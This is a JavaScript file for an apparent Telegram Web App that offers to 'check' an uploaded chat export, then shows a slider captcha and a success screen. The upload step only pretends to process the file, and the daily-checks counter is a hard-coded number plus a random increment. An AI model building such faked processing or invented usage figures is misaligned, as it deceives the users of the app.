// Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();
tg.setHeaderColor('#667eea');
tg.setBackgroundColor('#667eea');

// Variables
let currentScreen = 'languageScreen';
let selectedLanguage = 'ru';
let checkCount = 3004;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initLanguageSelection();
    initFileUpload();
    initCaptcha();
    updateStats();
});

// Language Selection - auto switch on click
function initLanguageSelection() {
    const languageItems = document.querySelectorAll('.language-item');
    
    languageItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active from all
            languageItems.forEach(i => i.classList.remove('active'));
            
            // Add active to clicked
            this.classList.add('active');
            
            // Get language code
            const langCode = this.querySelector('.language-code').textContent.toLowerCase();
            selectedLanguage = langCode;
            
            // Auto switch to main screen after 0.5 seconds
            setTimeout(() => {
                showScreen('mainScreen');
            }, 500);
        });
    });
}

// Show Screen
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.classList.add('active');
        currentScreen = screenId;
        window.scrollTo(0, 0);
    }
}

// Update Stats
function updateStats() {
    checkCount += Math.floor(Math.random() * 5) + 1;
    const statsElement = document.getElementById('todayChecks');
    if (statsElement) {
        statsElement.textContent = checkCount.toLocaleString('ru-RU');
    }
}

// File Upload
function initFileUpload() {
    const uploadArea = document.getElementById('uploadArea');
    const fileInput = document.getElementById('fileInput');
    
    if (!uploadArea || !fileInput) return;
    
    // Click upload
    uploadArea.addEventListener('click', () => fileInput.click());
    
    // File selection
    fileInput.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) processFile(file);
    });
    
    // Drag & drop
    uploadArea.addEventListener('dragover', function(e) {
        e.preventDefault();
        this.style.background = 'rgba(255, 255, 255, 0.15)';
    });
    
    uploadArea.addEventListener('dragleave', function() {
        this.style.background = '';
    });
    
    uploadArea.addEventListener('drop', function(e) {
        e.preventDefault();
        this.style.background = '';
        
        if (e.dataTransfer.files.length) {
            const file = e.dataTransfer.files[0];
            processFile(file);
        }
    });
}

// Process File
function processFile(file) {
    const validExts = ['.json', '.html', '.txt'];
    const fileExt = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
    
    if (!validExts.includes(fileExt)) {
        alert('❌ Пожалуйста, загрузите файл экспорта (.json, .html или .txt)');
        return;
    }
    
    // Show loading
    const uploadArea = document.getElementById('uploadArea');
    const originalHTML = uploadArea.innerHTML;
    
    uploadArea.innerHTML = `
        <div class="upload-icon">
            <i class="fas fa-spinner fa-spin"></i>
        </div>
        <div class="upload-text">Обработка...</div>
        <div class="upload-subtext">${file.name}</div>
    `;
    uploadArea.style.cursor = 'default';
    
    // Simulate processing and show captcha
    setTimeout(() => {
        showScreen('captchaScreen');
        
        // Restore upload area
        setTimeout(() => {
            uploadArea.innerHTML = originalHTML;
            uploadArea.style.cursor = 'pointer';
            initFileUpload(); // Re-init events
        }, 500);
    }, 1500);
}

// CAPTCHA - БЫСТРАЯ И НЕ ЛАГАЮЩАЯ
function initCaptcha() {
    const sliderHandle = document.getElementById('sliderHandle');
    const captchaSlider = document.getElementById('captchaSlider');
    
    if (!sliderHandle || !captchaSlider) return;
    
    let isDragging = false;
    let startX = 0;
    let sliderWidth = captchaSlider.offsetWidth;
    let handleWidth = sliderHandle.offsetWidth;
    let maxDistance = sliderWidth - handleWidth - 12;
    
    // Update sizes on resize
    function updateSizes() {
        sliderWidth = captchaSlider.offsetWidth;
        handleWidth = sliderHandle.offsetWidth;
        maxDistance = sliderWidth - handleWidth - 12;
    }
    
    window.addEventListener('resize', updateSizes);
    
    // Mouse events
    sliderHandle.addEventListener('mousedown', function(e) {
        isDragging = true;
        startX = e.clientX - sliderHandle.offsetLeft;
        sliderHandle.style.cursor = 'grabbing';
        e.preventDefault();
    });
    
    // Touch events
    sliderHandle.addEventListener('touchstart', function(e) {
        isDragging = true;
        startX = e.touches[0].clientX - sliderHandle.offsetLeft;
        sliderHandle.style.cursor = 'grabbing';
        e.preventDefault();
    }, { passive: false });
    
    // Mouse move
    document.addEventListener('mousemove', function(e) {
        if (!isDragging) return;
        
        let newX = e.clientX - startX;
        
        // Clamp position
        if (newX < 6) newX = 6;
        if (newX > maxDistance) newX = maxDistance;
        
        // Update position (NO TRANSITION - это ключ к отсутствию лагов)
        sliderHandle.style.left = newX + 'px';
        
        // Check if completed
        if (newX >= maxDistance - 2) {
            completeCaptcha();
        }
    });
    
    // Touch move
    document.addEventListener('touchmove', function(e) {
        if (!isDragging) return;
        
        let newX = e.touches[0].clientX - startX;
        
        // Clamp position
        if (newX < 6) newX = 6;
        if (newX > maxDistance) newX = maxDistance;
        
        // Update position (NO TRANSITION)
        sliderHandle.style.left = newX + 'px';
        
        // Check if completed
        if (newX >= maxDistance - 2) {
            completeCaptcha();
        }
    }, { passive: false });
    
    // Mouse up
    document.addEventListener('mouseup', function() {
        if (!isDragging) return;
        isDragging = false;
        sliderHandle.style.cursor = 'grab';
        
        // Reset if not completed
        if (parseInt(sliderHandle.style.left) < maxDistance - 10) {
            sliderHandle.style.left = '6px';
        }
    });
    
    // Touch end
    document.addEventListener('touchend', function() {
        if (!isDragging) return;
        isDragging = false;
        sliderHandle.style.cursor = 'grab';
        
        // Reset if not completed
        if (parseInt(sliderHandle.style.left) < maxDistance - 10) {
            sliderHandle.style.left = '6px';
        }
    });
    
    // Complete captcha
    function completeCaptcha() {
        if (!isDragging) return;
        isDragging = false;
        
        // Snap to end
        sliderHandle.style.left = maxDistance + 'px';
        sliderHandle.style.background = 'linear-gradient(135deg, #34C759, #30D158)';
        sliderHandle.innerHTML = '<i class="fas fa-check"></i>';
        sliderHandle.style.cursor = 'default';
        
        // Update text
        const sliderText = document.querySelector('.slider-text');
        if (sliderText) {
            sliderText.textContent = '✅ Успешно!';
            sliderText.style.color = '#34C759';
        }
        
        // Show success screen
        setTimeout(() => {
            showScreen('successScreen');
            
            // Send data to bot
            if (tg.sendData) {
                tg.sendData(JSON.stringify({
                    action: 'captcha_completed',
                    language: selectedLanguage,
                    timestamp: new Date().toISOString()
                }));
            }
        }, 800);
    }
}

// Close App
function closeApp() {
    tg.close();
}

// Modal Functions
function showInstruction() {
    document.getElementById('instructionModal').style.display = 'flex';
}

function showFAQ() {
    alert('FAQ будет добавлен в следующем обновлении');
}

function closeModal() {
    document.getElementById('instructionModal').style.display = 'none';
}

// Back button for modal (optional)
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('modal')) {
        closeModal();
    }
});
